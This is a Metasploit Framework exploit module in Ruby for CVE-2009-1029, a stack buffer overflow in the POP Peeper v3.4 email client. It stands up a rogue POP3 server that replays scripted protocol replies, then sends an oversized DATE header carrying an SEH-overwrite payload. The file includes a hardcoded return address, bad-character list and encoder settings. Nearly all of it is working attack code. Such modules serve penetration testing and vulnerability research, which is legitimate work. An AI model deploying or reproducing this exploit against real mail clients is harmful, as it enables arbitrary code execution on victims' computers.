##
# $Id: poppeeper_date.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'POP Peeper v3.4 DATE Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in POP Peeper v3.4.
				When a specially crafted DATE string is sent to a client,
				an attacker may be able to execute arbitrary code. This
				module is based off of krakowlabs code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'CVE', '2009-1029' ],
					[ 'OSVDB', '53560'],
					[ 'BID', '34093' ],
					[ 'URL', 'http://www.krakowlabs.com/res/adv/KL0209ADV-poppeeper_date-bof.txt' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00\x0a\x20\x0d",
					'StackAdjustment'  => -3500,
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'DisableNops' => 'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'POP Peeper v3.4',	{ 'Ret' => 0x10014e39 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 27 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The POP daemon port to listen on", 110 ])
			], self.class)
	end

	def on_client_connect(client)
		ok = "+OK\r\n"
		client.put(ok)
	end

	def on_client_data(client)
		return if ((p = regenerate_payload(client)) == nil)

		ok = "+OK\r\n"
		client.put(ok)

		client.get_once

		ok = "+OK\r\n"
		client.put(ok)

		client.get_once

		ok = "+OK 1 100\r\n"
		client.put(ok)

		client.get_once

		ok = "+OK\r\n1 " + rand_text_english(4) + "\r\n.\r\n"
		client.put(ok)

		client.get_once

		ok = "+OK 1 100\r\n.\r\n"
		client.put(ok)

		client.get_once

		ok = "+OK 100 octects\r\n"
		client.put(ok)

		sploit = "Date: " + rand_text_alpha_upper(132) + generate_seh_payload(target.ret) + "\r\n.\r\n"
		client.put(sploit)

		handler
		service.close_client(client)
	end

end
